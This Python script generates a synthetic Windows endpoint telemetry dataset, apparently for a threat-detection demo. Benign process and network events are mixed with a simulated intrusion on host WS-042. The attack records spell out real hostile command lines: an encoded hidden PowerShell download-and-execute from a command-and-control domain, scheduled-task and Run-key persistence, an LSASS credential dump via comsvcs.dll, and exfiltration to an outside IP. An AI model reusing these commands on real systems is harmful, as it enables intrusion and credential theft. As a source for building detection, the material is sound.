"""
Generate a synthetic Windows endpoint telemetry dataset for the demo.

Contains ~100 benign events across two hosts plus one realistic attack chain
on WS-042 (macro doc -> PowerShell -> C2 -> dropper -> persistence -> discovery).
Also includes a couple of *benign* look-alikes (an admin running PowerShell,
a legitimate Windows Update scheduled task) so the agent has to discriminate.

Usage:  python make_sample_data.py   -> writes data/sample_telemetry.json and .csv
"""
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

import pandas as pd

random.seed(7)
OUT = Path(__file__).parent / "data"
OUT.mkdir(exist_ok=True)

BASE = datetime(2026, 9, 18, 10, 20, 0)


def ts(offset_s: float) -> str:
    return (BASE + timedelta(seconds=offset_s)).strftime("%Y-%m-%dT%H:%M:%SZ")


events: list[dict] = []


def ev(offset_s, host, user, event_type, **kw):
    e = {"timestamp": ts(offset_s), "host": host, "user": user, "event_type": event_type}
    e.update(kw)
    events.append(e)


# ---------------------------------------------------------------------------
# Benign background noise (both hosts)
# ---------------------------------------------------------------------------
BENIGN = [
    ("chrome.exe", "explorer.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --profile-directory=Default"),
    ("OUTLOOK.EXE", "explorer.exe", r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "OUTLOOK.EXE"),
    ("Teams.exe", "explorer.exe", r"C:\Users\{u}\AppData\Local\Microsoft\Teams\current\Teams.exe", "Teams.exe --system-initiated"),
    ("svchost.exe", "services.exe", r"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs -p -s wuauserv"),
    ("SearchIndexer.exe", "services.exe", r"C:\Windows\System32\SearchIndexer.exe", "SearchIndexer.exe /Embedding"),
    ("OneDrive.exe", "explorer.exe", r"C:\Users\{u}\AppData\Local\Microsoft\OneDrive\OneDrive.exe", "OneDrive.exe /background"),
    ("EXCEL.EXE", "explorer.exe", r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", r'EXCEL.EXE "C:\Users\{u}\Documents\budget.xlsx"'),
]
BENIGN_DOMAINS = [
    ("outlook.office365.com", "52.96.165.2", 443),
    ("teams.microsoft.com", "52.113.194.132", 443),
    ("www.google.com", "142.250.190.36", 443),
    ("update.microsoft.com", "20.109.209.108", 443),
    ("onedrive.live.com", "13.107.42.13", 443),
    ("github.com", "140.82.112.4", 443),
]

hosts = [("WS-042", "jdoe"), ("WS-017", "asmith")]
pid_counter = {"WS-042": 5000, "WS-017": 7000}


def next_pid(host):
    pid_counter[host] += random.randint(4, 60)
    return pid_counter[host]


for host, user in hosts:
    explorer_pid = 3300 if host == "WS-042" else 3412
    services_pid = 820
    for i in range(22):
        t = random.uniform(0, 1500)
        name, parent, path, cmd = random.choice(BENIGN)
        pid = next_pid(host)
        ppid = explorer_pid if parent == "explorer.exe" else services_pid
        ev(t, host, user if parent == "explorer.exe" else "SYSTEM", "process_start",
           pid=pid, ppid=ppid, process=name, parent_process=parent,
           image_path=path.replace("{u}", user), command_line=cmd.replace("{u}", user))
        if name in ("chrome.exe", "OUTLOOK.EXE", "Teams.exe", "OneDrive.exe", "svchost.exe"):
            dom, ip, port = random.choice(BENIGN_DOMAINS)
            ev(t + random.uniform(0.5, 3), host, user, "dns_query", pid=pid, process=name, domain=dom, resolved_ip=ip)
            ev(t + random.uniform(3, 6), host, user, "network_connect", pid=pid, process=name,
               dest_ip=ip, dest_port=port, protocol="tcp", domain=dom)
        if name in ("EXCEL.EXE", "OUTLOOK.EXE", "OneDrive.exe"):
            ev(t + random.uniform(5, 40), host, user, "file_modify", pid=pid, process=name,
               file_path=rf"C:\Users\{user}\Documents\{random.choice(['budget.xlsx','notes.docx','report.pdf'])}")

# Benign look-alike #1: legitimate Windows Update scheduled task from svchost
ev(300, "WS-017", "SYSTEM", "scheduled_task", pid=1204, process="svchost.exe",
   task_name=r"\Microsoft\Windows\WindowsUpdate\Scheduled Start",
   task_action=r"C:\Windows\System32\sc.exe start wuauserv", action="created")

# Benign look-alike #2: admin on WS-017 runs PowerShell interactively from explorer
ev(900, "WS-017", "asmith", "process_start", pid=7350, ppid=3412, process="powershell.exe",
   parent_process="explorer.exe", image_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
   command_line="powershell.exe")
ev(915, "WS-017", "asmith", "process_start", pid=7362, ppid=7350, process="Get-Service",
   parent_process="powershell.exe", command_line="Get-Service -Name Spooler")

# ---------------------------------------------------------------------------
# ATTACK CHAIN on WS-042 (user jdoe) -- starts at BASE + 11 min  (10:31)
# ---------------------------------------------------------------------------
A = 655  # 10:30:55
H, U = "WS-042", "jdoe"
OUTLOOK_PID, WINWORD_PID, PS_PID, SCHTASKS_PID = 4410, 4120, 4488, 4512
C2_IP, C2_DOMAIN = "185.220.101.47", "cdn-update-status.com"
DROPPER = r"C:\Users\jdoe\AppData\Roaming\Microsoft\update.ps1"
DROPPER_HASH = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
DOC_HASH = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"

ev(A - 400, H, U, "process_start", pid=OUTLOOK_PID, ppid=3300, process="OUTLOOK.EXE", parent_process="explorer.exe",
   image_path=r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", command_line="OUTLOOK.EXE")
ev(A, H, U, "file_create", pid=OUTLOOK_PID, process="OUTLOOK.EXE",
   file_path=r"C:\Users\jdoe\Downloads\Invoice_Q3_2026.docm", file_hash=DOC_HASH, file_size=48213)
ev(A + 7, H, U, "process_start", pid=WINWORD_PID, ppid=3300, process="WINWORD.EXE", parent_process="explorer.exe",
   image_path=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
   command_line=r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\jdoe\Downloads\Invoice_Q3_2026.docm"')
ev(A + 12, H, U, "process_start", pid=PS_PID, ppid=WINWORD_PID, process="powershell.exe", parent_process="WINWORD.EXE",
   image_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
   command_line="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB0AGEAdAB1AHMALgBjAG8AbQAvAGEAJwApAA==",
   command_line_decoded="IEX (New-Object Net.WebClient).DownloadString('https://cdn-update-status.com/a')")
ev(A + 13, H, U, "dns_query", pid=PS_PID, process="powershell.exe", domain=C2_DOMAIN, resolved_ip=C2_IP)
ev(A + 13.5, H, U, "network_connect", pid=PS_PID, process="powershell.exe", dest_ip=C2_IP, dest_port=443,
   protocol="tcp", domain=C2_DOMAIN, bytes_sent=1240, bytes_received=88412)
ev(A + 15, H, U, "file_create", pid=PS_PID, process="powershell.exe", file_path=DROPPER, file_hash=DROPPER_HASH, file_size=17204)
ev(A + 18, H, U, "process_start", pid=SCHTASKS_PID, ppid=PS_PID, process="schtasks.exe", parent_process="powershell.exe",
   image_path=r"C:\Windows\System32\schtasks.exe",
   command_line=rf'schtasks.exe /Create /F /SC MINUTE /MO 30 /TN "WindowsUpdateCheck" /TR "powershell.exe -NoP -W Hidden -File {DROPPER}"')
ev(A + 19, H, U, "scheduled_task", pid=SCHTASKS_PID, process="schtasks.exe", task_name="WindowsUpdateCheck",
   task_action=rf"powershell.exe -NoP -W Hidden -File {DROPPER}", schedule="every 30 minutes", action="created")
ev(A + 25, H, U, "registry_set", pid=PS_PID, process="powershell.exe",
   registry_key=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", registry_value_name="UpdateCheck",
   registry_value=rf"powershell.exe -NoP -W Hidden -File {DROPPER}")
# Discovery
for dt, pid, name, cmd in [
    (70, 4530, "whoami.exe", "whoami.exe /all"),
    (74, 4536, "net.exe", "net.exe user /domain"),
    (77, 4541, "net.exe", "net.exe group \"Domain Admins\" /domain"),
    (81, 4547, "ipconfig.exe", "ipconfig.exe /all"),
    (85, 4552, "nltest.exe", "nltest.exe /dclist:corp.local"),
]:
    ev(A + dt, H, U, "process_start", pid=pid, ppid=PS_PID, process=name, parent_process="powershell.exe",
       image_path=rf"C:\Windows\System32\{name}", command_line=cmd)
# Credential access attempt
ev(A + 150, H, U, "process_start", pid=4610, ppid=PS_PID, process="rundll32.exe", parent_process="powershell.exe",
   image_path=r"C:\Windows\System32\rundll32.exe",
   command_line=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\jdoe\AppData\Local\Temp\ls.dmp full")
ev(A + 152, H, U, "file_create", pid=4610, process="rundll32.exe", file_path=r"C:\Users\jdoe\AppData\Local\Temp\ls.dmp", file_size=48221184)
# C2 beacons
for dt in (165, 345, 525):
    ev(A + dt, H, U, "network_connect", pid=PS_PID, process="powershell.exe", dest_ip=C2_IP, dest_port=443,
       protocol="tcp", domain=C2_DOMAIN, bytes_sent=random.randint(800, 2000), bytes_received=random.randint(200, 900))
# Exfil of the dump
ev(A + 200, H, U, "network_connect", pid=PS_PID, process="powershell.exe", dest_ip="45.155.205.233", dest_port=8443,
   protocol="tcp", bytes_sent=48300000, bytes_received=1200)

# ---------------------------------------------------------------------------
events.sort(key=lambda e: e["timestamp"])
for i, e in enumerate(events, 1):
    e["event_id"] = i

df = pd.DataFrame(events)
(OUT / "sample_telemetry.json").write_text(json.dumps(events, indent=1), encoding="utf-8")
df.to_csv(OUT / "sample_telemetry.csv", index=False)
print(f"wrote {len(events)} events -> {OUT / 'sample_telemetry.json'} and .csv")
print(df.event_type.value_counts().to_string())
